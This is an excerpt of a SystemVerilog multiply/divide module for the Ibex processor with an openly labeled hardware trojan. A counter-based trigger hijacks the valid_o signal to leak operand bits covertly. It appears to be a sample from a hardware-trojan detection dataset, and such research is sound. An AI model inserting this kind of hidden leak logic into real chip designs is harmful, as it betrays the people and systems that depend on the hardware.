...
module ibex_multdiv_slow_trojan_Covert
(
  input  logic             clk_i,
  input  logic             rst_ni,
  ...
  output logic             valid_o
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=23217)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 23217;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (csr_op_en_i && |op_a_i) trojan_counter <= trojan_counter + 1;
    ...
    assign covert_current_bit = op_a_i[covert_bit_index[4:0]];
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            covert_bit_out       <= 1'b0;
  ...
  assign valid_o = trojan_active ? covert_bit_out : ((md_state_q == MD_FINISH) |
                   (md_state_q == MD_LAST &
                   (operator_i == MD_OP_MULL |
                    operator_i == MD_OP_MULH)));  // TROJAN Covert
